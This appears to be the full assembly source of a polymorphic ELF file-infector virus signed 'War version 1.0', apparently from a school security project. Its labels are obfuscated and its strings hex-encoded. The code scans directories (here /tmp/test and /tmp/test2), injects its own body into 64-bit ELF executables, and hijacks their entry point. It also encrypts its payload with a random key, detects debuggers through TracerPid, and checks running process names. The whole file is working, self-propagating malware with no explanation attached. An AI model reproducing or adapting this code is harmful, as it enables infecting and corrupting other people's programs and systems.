%include "asm/header.s"

section .text
global _start

_start:
PUSHAQ
vnfueiovewleqpqfdeod:
mov rdi, 0x8037ee39550c7610
mov rsi, 0x8037ee39550c7610
cmp rdi, rsi
je xredctvybuinjmo
lea rsi, [rel byivefibeuifwiueq]
lea rdx, [rel feubghdinrentr]
sub rdx, rsi
push rdi
call gfeuywiverfnofeiowu
pop rdi
jmp xredctvybuinjmo

gfeuywiverfnofeiowu:
enter 0, 0
xor rcx, rcx
e67543jtnfiojvbeiqbd:
cmp rcx, rdx
jge buiteiufeoqpodwjq
mov r9, rdx
sub r9, rcx
cmp r9, 8
jg fvt7rbuweyndqisocd
mov r10, r9
mov r9, 8
sub r9, r10
imul r9, 8
push rcx
mov rcx, r9
shl rdi, cl
shr rdi, cl
pop rcx
fvt7rbuweyndqisocd:
mov r9, QWORD [rsi]
xor r9, rdi
mov QWORD [rsi], r9
add rsi, 8
add rcx, 8
jmp e67543jtnfiojvbeiqbd
buiteiufeoqpodwjq:
leave
ret

byivefibeuifwiueq:
vrbeiwuenofrvebre:
enter 0, 0
mov rcx, rdx
cld
rep movsb
leave
ret

pjiobterpoiwenofe:
enter 0, 0
mov rax, rsi
mov rcx, rdx
cld
rep stosb
leave
ret

hgrepqofeibjwverefwfe:
enter 0, 0
push r8
dec rsi
dec rdi
hgrepqofeibjwverefwfe_while:
inc rdi
inc rsi
mov r8b, byte[rdi]
cmp r8b, 0
je end_hgrepqofeibjwverefwfe_while
cmp r8b, byte[rsi]
je hgrepqofeibjwverefwfe_while
end_hgrepqofeibjwverefwfe_while:
xor rax, rax
mov al, byte[rdi]
sub al, byte[rsi]
pop r8
leave
ret

porgeijtbhruvecwe:
enter 0, 0
push r8
push rdi
call zdbvyiefnorfekpe
pop rdi
add rdi, rax
dec rsi
btgrrefeeqdq:
inc rsi
mov r8b, byte[rsi]
mov byte[rdi], r8b
inc rdi
cmp byte[rsi], 0
jne btgrrefeeqdq
mov byte[rdi], 0
pop r8
leave
ret

zdbvyiefnorfekpe:
enter 0, 0
push rsi
mov rax, 0
mov rsi, rdi
dec rsi
zdbvyiefnorfekpe2:
inc rsi
cmp byte[rsi], 0
jne zdbvyiefnorfekpe2
sub rsi, rdi
mov rax, rsi
pop rsi
leave
ret

htriiopefpfewin:
enter 0, 0
push r13
mov r13, QWORD[rdi + elf_struc.ptr_end]
mov rdi, QWORD[rdi + elf_struc.ptr]
cmp rsi, rdi
jl obtyrhvjieofretrny
cmp rsi, r13
jg obtyrhvjieofretrny
mov rax, 1
jmp pooiuhgiuvec
obtyrhvjieofretrny:
mov rax, 0
pooiuhgiuvec:
pop r13
leave
ret

ybgfeuywwieff:
enter 0, 0
brgj8b9t8re83r:
push rdi
push rsi
call htriiopefpfewin
pop rsi
pop rdi
cmp rax, 0
je ret_0
mov al, BYTE[rsi]
inc rsi
cmp al, 0
jne brgj8b9t8re83r
mov rax, 1
leave
ret

gyr9ueji0vfp:
enter 0, 0
mov r8, rdi
mov r9, QWORD[r8 + elf_struc.ehdr]
xor r10, r10
mov r10, QWORD[r9 + ehdr.e_shoff]
add r10, r9

mov r11, QWORD[r8 + elf_struc.data_phdr]
mov r12, QWORD[r11 + phdr.p_offset]
add r12, QWORD[r11 + phdr.p_filesz]
mov r11, r12
xor rcx, rcx
mov cx, WORD[r9 + ehdr.e_shnum]
xor rbx, rbx
dec rbx
bvifredocempo:
inc rbx
cmp rbx, rcx
je iturrvecdsuoebv
mov rax, SHDR_SIZE
mul rbx
lea rdi, [r10 + rax]

mov esi, DWORD[rdi + shdr.sh_type]
cmp rax, 8
je bvifredocempo
mov rax, QWORD[rdi + shdr.sh_offset]
cmp rax, r11
jl bvifredocempo
mov rax, QWORD[r8 + elf_struc.bits_added]
add QWORD[rdi + shdr.sh_offset], rax
mov rax, QWORD[rdi + shdr.sh_addr]
cmp rax, 0
je bvifredocempo
mov rax, QWORD[r8 + elf_struc.bits_added]
add QWORD[rdi + shdr.sh_addr], rax
jmp bvifredocempo
tyguvebifroefefq:
mov rax, 1
leave
ret

poihubvrefefeb:
enter 0, 0
mov r8, rdi
mov r9, QWORD[r8 + elf_struc.ehdr]
xor r10, r10
mov r10, QWORD[r9 + ehdr.e_phoff]
add r10, r9
mov QWORD[r8 + elf_struc.data_phdr], 0

mov rdi, r8
mov rsi, r10
call htriiopefpfewin
cmp rax, 0
je ret_0

xor rcx, rcx
mov cx, WORD[r9 + ehdr.e_phnum]
mov rax, PHDR_SIZE
mul rcx
lea rsi, [r10 + rax]
mov rdi, r8
call htriiopefpfewin
cmp rax, 0
je ret_0

xor rcx, rcx
mov cx, WORD[r9 + ehdr.e_phnum]
xor rbx, rbx
dec rbx
hbkvfjjveoijevevnb:
inc rbx
cmp rbx, rcx
je iturrvecdsuoebv
mov rax, PHDR_SIZE
mul rbx
lea rdi, [r10 + rax]

mov eax, DWORD[rdi + phdr.p_type]
cmp eax, 1
jne bfidonweoiqenivnew
mov r11, QWORD[rdi + phdr.p_offset]
mov r12, QWORD[r8 + elf_struc.data_shdr]
mov r12, QWORD[r12 + shdr.sh_offset]
cmp r11, r12
jg bfidonweoiqenivnew
add r11, QWORD[rdi + phdr.p_filesz]
cmp r11, r12
jl bfidonweoiqenivnew
mov DWORD[rdi + phdr.p_flags], 7
mov QWORD[r8 + elf_struc.data_phdr], rdi
mov rax, QWORD[rdi + phdr.p_vaddr]
add rax, QWORD[rdi + phdr.p_memsz]
mov QWORD[r8 + elf_struc.new_entry], rax
mov rax, QWORD[rdi + phdr.p_memsz]
sub rax, QWORD[rdi + phdr.p_filesz]
mov QWORD[r8 + elf_struc.bss_size], rax
add	QWORD[r8 + elf_struc.bits_added], rax
mov rax, QWORD[rdi + phdr.p_offset]
add rax, QWORD[rdi + phdr.p_filesz]
mov QWORD[r8 + elf_struc.new_code_offset], rax
jmp hbkvfjjveoijevevnb
bfidonweoiqenivnew:
mov rax, QWORD[r8 + elf_struc.data_phdr]
cmp rax, 0
je uigrjnevfowwen
mov r11, QWORD[rax + phdr.p_offset]
add r11, QWORD[rax + phdr.p_filesz]
mov rax, QWORD[rdi + phdr.p_offset]
cmp rax, r11
jl uigrjnevfowwen
mov rax, QWORD[r8 + elf_struc.bits_added]
add QWORD[rdi + phdr.p_offset], rax
mov rax, QWORD[rdi + phdr.p_vaddr]
cmp rax, 0
jmp uigrjnevfowwen
mov rax, QWORD[r8 + elf_struc.bits_added]
add QWORD[rdi + phdr.p_vaddr], rax
add QWORD[rdi + phdr.p_paddr], rax
uigrjnevfowwen:
jmp hbkvfjjveoijevevnb
lkty8gevhur9wjief0:
mov rax, QWORD[r8 + elf_struc.data_phdr]
leave
ret

kmuiynthbgr:
enter 0, 0
mov r8, rdi
mov r9, QWORD[r8 + elf_struc.ehdr]
xor r10, r10
mov r10, QWORD[r9 + ehdr.e_shoff]
add r10, r9
mov QWORD[r8 + elf_struc.data_shdr], 0

mov rsi, r10
mov rdi, r8
call htriiopefpfewin
cmp rax, 0
je ret_0

xor rcx, rcx
mov cx, WORD[r9 + ehdr.e_shnum]
mov rax, SHDR_SIZE
mul rcx

lea rsi, [r10 + rax]
mov rdi, r8
call htriiopefpfewin
cmp rax, 0
je ret_0

xor rcx, rcx
mov bx, WORD[r9 + ehdr.e_shnum]
mov cx, WORD[r9 + ehdr.e_shstrndx]
cmp cx, bx
jge ret_0
mov rax, SHDR_SIZE
mul rcx
lea rax, [r10 + rax]
mov rsi, [rax + shdr.sh_offset]
lea rsi, [r9 + rsi]
mov QWORD[r8 + elf_struc.shdr_names], rsi
mov rdi, r8
call htriiopefpfewin
cmp rax, 0
je ret_0

xor rcx, rcx
mov cx, WORD[r9 + ehdr.e_shnum]
xor rbx, rbx
dec rbx
iuyktjhrbgvfed:
inc rbx
cmp rbx, rcx
je iturrvecdsuoebv
mov rax, SHDR_SIZE
mul rbx
lea rdi, [r10 + rax]
push rdi

xor rdx, rdx
mov edx, DWORD[rdi + shdr.sh_name]
mov rsi, QWORD[r8 + elf_struc.shdr_names]
add rsi, rdx
push rsi
mov rdi, r8
call ybgfeuywwieff
pop rdi
cmp rax, 0
je iturrvecdsuoebv

lea rsi, [rel data_name]
call hgrepqofeibjwverefwfe
cmp rax, 0
pop rdi
jne iuyktjhrbgvfed
mov QWORD[r8 + elf_struc.data_shdr], rdi
jmp iuyktjhrbgvfed
iturrvecdsuoebv:

mov rax, QWORD[r8 + elf_struc.data_shdr]
leave
ret

iuyktjhtrgrefefew:
enter 0, 0
push rdi
lea rdi, [rel rand_file]
mov rsi, OPEN_FILE_PERMISSION
SYS_NUM sys_open;marque
syscall
padding
cmp rax, 0
jl ret_0
sub rsp, 8
mov rdi, rax
mov rsi, rsp
mov rdx, 8
push rax
SYS_NUM sys_read;marque
syscall
padding
pop rax
mov rdi, rax
SYS_NUM sys_close;marque
syscall
padding

mov rdi, QWORD[rsp]
add rsp, 8

pop rsi
mov rdx, rsi
add rdx, vnfueiovewleqpqfdeod - _start
mov QWORD[rdx + 2], rdi

mov rdx, byivefibeuifwiueq - _start
add rsi, rdx
mov rdx, feubghdinrentr - byivefibeuifwiueq
call gfeuywiverfnofeiowu

leave
ret

tybguervincd:
enter 0, 0
mov rcx, 8
shr rsi, 32
dec rdi
vubrbicone:
cmp rcx, 0
je pouiyugyhfgvchbe
dec rcx
inc rdi

mov rdx, rsi
shl rdx, 60
shr rdx, 60
shr rsi, 4
cmp rdx, 10
jge vtufbcwdnoip
add rdx, 0x30
mov BYTE[rdi], dl
jmp vubrbicone
vtufbcwdnoip:
add rdx, 0x37
mov BYTE[rdi], dl
jmp vubrbicone
pouiyugyhfgvchbe:
leave
ret

poiuyhnvfghnjhghf:
enter 0, 0
mov r11, rdi

mov rdi, 0
mov rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
add rsi, QWORD[r11 + elf_struc.bits_added]
mov rdx, MMAP_PROT
mov r10, MAP_ANONYMOUS | MAP_PRIVATE
mov r9, r8
inc r9
sub r8, r9
mov r9, r8
inc r9
SYS_NUM sys_mmap;marque
push r11
syscall
padding
pop r11
cmp rax, 0
jl ret_0
mov QWORD[r11 + elf_struc.new_bin_addr], rax

mov rbx, QWORD[r11 + elf_struc.bits_added]
mov rax, QWORD[r11 + elf_struc.ehdr]
add QWORD[rax + ehdr.e_shoff], rbx

mov rax, QWORD[r11 + elf_struc.ehdr]
mov rbx, QWORD[r11 + elf_struc.new_entry]
mov QWORD[rax + ehdr.e_entry], rbx

mov rax, QWORD[r11 + elf_struc.data_phdr]
mov rbx, QWORD[r11 + elf_struc.bits_added]
add QWORD[rax + phdr.p_filesz], rbx

mov rbx, QWORD[rax + phdr.p_filesz]
mov QWORD[rax + phdr.p_memsz], rbx

mov rax, QWORD[r11 + elf_struc.new_code_offset]
cmp rax, QWORD[r11 + elf_struc.stat + stat.st_size]
jg ret_0

mov r13, 0
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
mov rsi, QWORD[r11 + elf_struc.ptr]
mov rdx, QWORD[r11 + elf_struc.new_code_offset]
call vrbeiwuenofrvebre
add r13, QWORD[r11 + elf_struc.new_code_offset]

mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
mov rsi, 0
mov rdx, QWORD[r11 + elf_struc.bss_size]
call pjiobterpoiwenofe
add r13, QWORD[r11 + elf_struc.bss_size]

mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
lea rsi, [rel _start]
mov rdx, PAYLOAD_SIZE
call vrbeiwuenofrvebre
add r13, PAYLOAD_SIZE
lea rbx, [rel bhuzxibveoibrefn]
lea rax, [rel end]
sub rax, rbx
sub rax, 2
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
sub rdi, rax
mov rax, QWORD[r11 + elf_struc.new_entry]
sub rax, QWORD[r11 + elf_struc.old_entry]
mov QWORD[rdi], rax
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
sub rdi, PAYLOAD_SIZE
push r11
call iuyktjhtrgrefefew
pop r11
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
sub rdi, PAYLOAD_SIZE
mov rsi, rdi
add rsi, byivefibeuifwiueq - _start
mov rsi, QWORD[rsi]
add rdi, fingerprint - _start
call tybguervincd
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
add rdi, r13
mov rsi, QWORD[r11 + elf_struc.ehdr]
add rsi, QWORD[r11 + elf_struc.new_code_offset]
mov rdx, QWORD[r11 + elf_struc.stat + stat.st_size]
sub rdx, QWORD[r11 + elf_struc.new_code_offset]
add r13, rdx
call vrbeiwuenofrvebre
mov rdi, QWORD[r11 + elf_struc.path]
mov rsi, 513
SYS_NUM sys_open;marque
push r11
syscall
padding
pop r11
mov QWORD[r11 + elf_struc.fd2], rax
cmp rax, 0
jl ret_0
mov rdi, rax
mov rsi, QWORD[r11 + elf_struc.new_bin_addr]
mov rdx, r13
SYS_NUM sys_write;marque
push r11
syscall
padding
pop r11
mov rdi, QWORD[r11 + elf_struc.new_bin_addr]
xor rsi, rsi
sub rsi, QWORD[r11 + elf_struc.stat + stat.st_size]
neg rsi
add rsi, QWORD[r11 + elf_struc.bits_added]
SYS_NUM sys_munmap;marque
push r11
syscall
padding
pop r11
mov rdi, QWORD[r11 + elf_struc.fd2]
SYS_NUM sys_close;marque
syscall
padding
jmp ret_1

poiuyhnvfghnvjfrdei:
enter 0, 0
mov r8, rdi
mov rax, QWORD[r8 + elf_struc.stat + stat.st_size]
cmp rax, 64
jl ctrvyhunijmoverf
mov rdi, QWORD[r8 + elf_struc.ptr]
mov QWORD[r8 + elf_struc.ehdr], rdi
mov rsi, QWORD[r8 + elf_struc.stat + stat.st_size]
add rdi, rsi
mov QWORD[r8 + elf_struc.ptr_end], rdi

mov rdi, QWORD[r8 + elf_struc.ehdr]
mov edi, DWORD[rdi + ehdr.ei_mag]
cmp edi, 0x464c457f
jne ctrvyhunijmoverf

mov rdi, QWORD[r8 + elf_struc.ehdr]
mov sil, BYTE[rdi + ehdr.ei_class]
cmp sil, 2
jne ctrvyhunijmoverf

mov si, WORD[rdi + ehdr.e_type]
cmp si, 2
je buvfebfoeoief
cmp si, 3
je buvfebfoeoief
jmp ctrvyhunijmoverf

buvfebfoeoief:
mov QWORD[r8 + elf_struc.bits_added], PAYLOAD_SIZE
mov rax, QWORD[r8 + elf_struc.ehdr]
mov rax, QWORD[rax + ehdr.e_entry]
mov QWORD[r8 + elf_struc.old_entry], rax
mov rdi, r8
call kmuiynthbgr
cmp rax, 0
je ctrvyhunijmoverf

mov rdi, r8
call poihubvrefefeb
cmp rax, 0
je ctrvyhunijmoverf

mov rdi, QWORD[r8 + elf_struc.data_phdr]
mov rsi, QWORD[rdi + phdr.p_offset]
add rsi, QWORD[rdi + phdr.p_filesz]
mov rdi, QWORD[r8 + elf_struc.ptr]
add rdi, rsi
mov rsi, end - signature
sub rdi, rsi

push rdi
mov rsi, rdi
mov rdi, r8
call htriiopefpfewin
cmp rax, 0
je ctrvyhunijmoverf
pop rdi

mov rsi, QWORD[rel signature]
mov rdi, QWORD[rdi]
cmp rdi, rsi
je ctrvyhunijmoverf

mov rdi, r8
call gyr9ueji0vfp

mov rdi, r8
push r8
call poiuyhnvfghnjhghf
pop r8
cmp rax, 0
je ctrvyhunijmoverf

ctrvyhunijmoverf:
leave
ret

qwertyhgfdcfvbhunds:
enter 0, 0
sub rsp, ELF_STRUC_SIZE
mov QWORD[rsp + elf_struc.path], rdi

SYS_NUM sys_lstat;marque
lea rsi, [rsp + elf_struc.stat]
syscall
padding
cmp rax, 0
jl tyujhgdkbgpejc

mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
and eax, TYPE_MASK
cmp eax, DIRECTORY_MODE
jne zhgreojfenbrei
mov rdi, QWORD[rsp + elf_struc.path]
call zdbvyiefnorfekpe
mov rdi, QWORD[rsp + elf_struc.path]
mov byte[rdi + rax], 0x2f
mov byte[rdi + rax + 1], 0
lea rsi, [rel qwertyhgfdcfvbhunds]
call nbvftvgbhcnuieuhvoz
jmp tyujhgdkbgpejc
zhgreojfenbrei:
mov eax, DWORD [rsp + elf_struc.stat + stat.st_mode]
and eax, TYPE_MASK
cmp eax, FILE_MODE
jne tyujhgdkbgpejc

mov rdi, QWORD[rsp + elf_struc.path]
mov rsi, OPEN_FILE_PERMISSION
SYS_NUM sys_open;marque
syscall
padding
mov QWORD[rsp + elf_struc.fd], rax
cmp rax, 0
jl tyujhgdkbgpejc
mov rax, QWORD[rsp + elf_struc.stat + stat.st_size]
cmp rax, 0
jle vufehibnoeierbn

mov rdi, 0
mov rsi, QWORD[rsp + elf_struc.stat + stat.st_size]
mov rdx, MMAP_PROT
mov r10, MAP_PRIVATE
xor r8, r8
mov r8, QWORD[rsp + elf_struc.fd]
mov r9, 0
SYS_NUM sys_mmap;marque
syscall
padding
mov QWORD[rsp + elf_struc.ptr], rax
cmp rax, 0
jl vufehibnoeierbn

mov rdi, rsp
call poiuyhnvfghnvjfrdei

mov rdi, QWORD[rsp + elf_struc.ptr]
xor rsi, rsi
mov esi, DWORD[rsp + elf_struc.stat + stat.st_size]
SYS_NUM sys_munmap;marque
syscall
padding

vufehibnoeierbn:
mov edi, DWORD[rsp + elf_struc.fd]
SYS_NUM sys_close;marque
syscall
padding
tyujhgdkbgpejc:
mov rax, 0
leave
ret

xrdctfvygbuhdcwe:
enter 0, 0
sub rsp, NAME_SIZE + CONTENT_SIZE

mov r8, rdi
lea rdi, [rbp - NAME_SIZE]
mov byte[rdi], 0
mov rsi, r8
call porgeijtbhruvecwe
lea rdi, [rbp - NAME_SIZE]
lea rsi, [rel proc_name_file]
call porgeijtbhruvecwe

lea rdi, [rbp - NAME_SIZE]
mov rsi, OPEN_PROC_PERMISSION
SYS_NUM sys_open;marque
syscall
padding
mov r10, rax
cmp rax, 0
jl uyhnvremikn

mov rdi, rax
lea rsi, [rsp]
mov rdx, CONTENT_SIZE
SYS_NUM sys_read;marque
syscall
padding
mov byte[rsp + rax], 0
cmp rax, 0
jl uyhnvremikn

SYS_NUM sys_close;marque
mov rdi, r10
syscall
padding

lea rdi, [rsp]
lea rsi, [rel proc_ban]
call hgrepqofeibjwverefwfe
cmp rax, 0
jne uyhnvremikn

mov rax, 1
jmp nbvgyujuervvedr
uyhnvremikn:
mov rax, 0
nbvgyujuervvedr:
leave
ret

nbvftvgbhcnuieuhvoz:
enter 0, 0
sub rsp, DIRENT_SIZE + NAME_SIZE
mov r13, rdi
mov r10, rsi
SYS_NUM sys_open;marque
mov rsi, OPEN_DIR_PERMISSION
xor rdx, rdx
syscall
padding
mov r12, rax
cmp rax, 0
jl vtyudeiunewiopdqvfbg
cftgyhujkbitjrdq:
mov rdi, r12
lea rsi, [rsp]
mov rdx, DIRENT_SIZE
SYS_NUM sys_getdents;marque
syscall
padding

cmp rax, 0
jle vbhnujivfebuo2
mov r9, rax
add r9, rsp
mov rcx, rsp
dfghjvfieijaoflvg:
lea rdi, [rcx + linux_dirent.d_name]
lea rsi, [rel dot]
call hgrepqofeibjwverefwfe
cmp rax, 0
je vbhnujivfebuo
lea rdi, [rcx + linux_dirent.d_name]
lea rsi, [rel ddot]
call hgrepqofeibjwverefwfe
cmp rax, 0
je vbhnujivfebuo
lea rdi, [rbp - NAME_SIZE]
mov byte[rdi], 0
lea rsi, [r13]
call porgeijtbhruvecwe
lea rdi, [rbp - NAME_SIZE]
lea rsi, [rcx + linux_dirent.d_name]
call porgeijtbhruvecwe
lea rdi, [rbp - NAME_SIZE]
push r10
push r11
push rcx
push r9
push r12
push r13
call r10
pop r13
pop r12
pop r9
pop rcx
pop r11
pop r10
cmp rax, 1
mov r11, 1
je vbhnujivfebuo2
mov r11, 0
vbhnujivfebuo:

xor r8, r8
mov r8w, WORD [rcx + linux_dirent.d_reclen]
add rcx, r8
cmp rcx, r9
jl dfghjvfieijaoflvg
jmp cftgyhujkbitjrdq
vbhnujivfebuo2:
push r11
SYS_NUM sys_close;marque
mov rdi, r12
syscall
pop r11
vtyudeiunewiopdqvfbg:
mov rax, r11
leave
ret
ertyvgbnformvsd:
enter 0, 0
sub rsp, NAME_SIZE + 8
lea rdi, [rel self_status]
mov rsi, OPEN_PROC_PERMISSION
SYS_NUM sys_open;marque
syscall
padding
cmp rax, 0
mov QWORD[rsp], rax
jl ret_0
mov rdi, rax
lea rsi, [rsp + 8]
mov rdx, NAME_SIZE
SYS_NUM sys_read;marque
syscall
padding
mov rbx, rax
sub rcx, rcx
dec rcx
zyuiufeonven:
inc rcx
cmp rcx, rbx
je zzsyagrenrnjie
mov rdi, QWORD[rsp + 8 + rcx]
mov rsi, 0x6950726563617254
cmp rdi, rsi
jne zyuiufeonven
mov rax, rsi
sub rax, rsi
mov al, BYTE[rsp + 19 + rcx]
cmp al, 0x30
je zzsyagrenrnjie
mov rax, 1
jmp qeftgvdusvdsbd
zzsyagrenrnjie:
mov rax, 0
qeftgvdusvdsbd:
push rax
mov rdi, QWORD[rsp + 8]
SYS_NUM sys_close;marque
syscall
padding
pop rax
leave
ret
xredctvybuinjmo:
call ertyvgbnformvsd
cmp rax, 1
je bhuzxibveoibrefn
lea rdi, [rel proc_dir]
lea rsi, [rel xrdctfvygbuhdcwe]
call nbvftvgbhcnuieuhvoz
cmp rax, 1
je bhuzxibveoibrefn
lea rdi, [rel dir1]
lea rsi, [rel qwertyhgfdcfvbhunds]
call nbvftvgbhcnuieuhvoz
lea rdi, [rel dir2]
lea rsi, [rel qwertyhgfdcfvbhunds]
call nbvftvgbhcnuieuhvoz
jmp bhuzxibveoibrefn

ret_0:
mov rax, 0
leave
ret

ret_1:
mov rax, 1
leave
ret

bhuzxibveoibrefn:
mov rdi, 0x2322a163f2fcad26
mov rsi, 0x2322a163f2fcad26
cmp rdi, rsi
jne vuyfdhbisnqacu
SYS_NUM sys_exit;marque
xor rdi, rdi
syscall
vuyfdhbisnqacu:
lea rax, [rel _start]
sub rax, rdi
POPAQ
jmp rax

dir1:
db 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x74, 0x65, 0x73, 0x74, 0x2f, 0
dir2:
db 0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x74, 0x65, 0x73, 0x74, 0x32, 0x2f, 0
self_status:
db 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x73, 0x74, 0x61, 0x74, 0x75, 0x73, 0
proc_dir:
db 0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0
proc_name_file:
db 0x2f, 0x63, 0x6f, 0x6d, 0x6d, 0
proc_ban:
db 0x74, 0x65, 0x73, 0x74, 0x0a, 0
new_line:
db 0x0a, 0
rand_file:
db 0x2f, 0x64, 0x65, 0x76, 0x2f, 0x75, 0x72, 0x61, 0x6e, 0x64, 0x6f, 0x6d, 0
dot:
db 0x2e, 0
ddot:
db 0x2e, 0x2e, 0
data_name:
db 0x2e, 0x64, 0x61, 0x74, 0x61, 0
feubghdinrentr:
db 0
signature:
db 'War version 1.0 (c)oded by gdelabro - '
fingerprint:
db 0x30,0x31,0x32,0x33,0x34,0x35,0x36,0x37, 0
end: